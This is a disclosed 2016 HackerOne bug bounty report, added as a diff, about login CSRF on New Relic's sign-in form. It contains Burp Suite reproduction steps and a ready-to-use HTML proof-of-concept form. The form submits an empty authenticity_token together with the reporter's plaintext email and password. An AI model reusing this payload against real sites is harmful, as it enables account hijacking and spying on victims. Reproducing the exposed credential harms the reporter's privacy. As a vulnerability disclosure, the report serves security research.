@@ -1,0 +1,62 @@
+ReportLink:https://hackerone.com/reports/156992
+WeaknessName:Cross-Site Request Forgery (CSRF)
+Reporter:https://hackerone.com/jackcyril
+ReportedTo:New Relic(newrelic)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:12.08.2016 23:30:56
+
+Summary:
+
+Hi New Relic security team,
+
+While doing pentesting on your website, I found that while logging into the account  the "authenticity_token" was not properly validated. I was able to login into my account even without "authenticity_token".
+
+Impact: High
+
+Steps to Reproduce:
+
+1) Login to your account.
+2) While logging in make sure that the intercept is on in your burp suite.
+3) In burp suite, you can view the request you made after clicking on sign in.
+4) In the request, you'll find the "authenticity_token" parameter.
+5) Now, remove the value which is there in the "authenticity_token" parameter.
+6) And now forward the packet and off the interception in burp suite.
+7) Now, you'll successfully able to login without CSRF or authenticity_token.
+
+PoC: 
+
+1) Copy the below code to the notepad and save it in the .html format.
+
+<html>
+  <body>
+    <form action="https://login.newrelic.com/login?return_to=https%3A%2F%2Frpm.newrelic.com%2Fauth%2Fnewrelic%3Forigin%3Dhttps%253A%252F%252Frpm.newrelic.com%252Faccounts%252F1397211%252Fsetup" method="POST">
+      <input type="hidden" name="utf8" value="â&#156;&#147;" />
+      <input type="hidden" name="authenticity&#95;token" value="" />
+      <input type="hidden" name="return&#95;to" value="https&#58;&#47;&#47;rpm&#46;newrelic&#46;com&#47;auth&#47;newrelic&#63;origin&#61;https&#37;3A&#37;2F&#37;2Frpm&#46;newrelic&#46;com&#37;2Faccounts&#37;2F1397211&#37;2Fsetup" />
+      <input type="hidden" name="login&#91;email&#93;" value="jackcyril007&#64;gmail&#46;com" />
+      <input type="hidden" name="login&#91;password&#93;" value="90sh&#64;n12345" />
+      <input type="hidden" name="login&#91;remember&#95;me&#93;" value="0" />
+      <input type="hidden" name="commit" value="Sign&#32;in" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+
+2) Send this file to the victim and when the victim clicks on submit button in the victims browser, the  victim will now be able to login with the attackers login credentials.
+
+3) And after that an attacker can later log into the site with his/her legitimate credentials and view private information like activity history of the victim that has been saved in the account.
+
+
+Mitigation:
+
+Please refer the following link:
+
+https://www.owasp.org/index.php/CSRF_Prevention_Cheat_Sheet
+
+
+
+
+Thank you,
+Praseudo
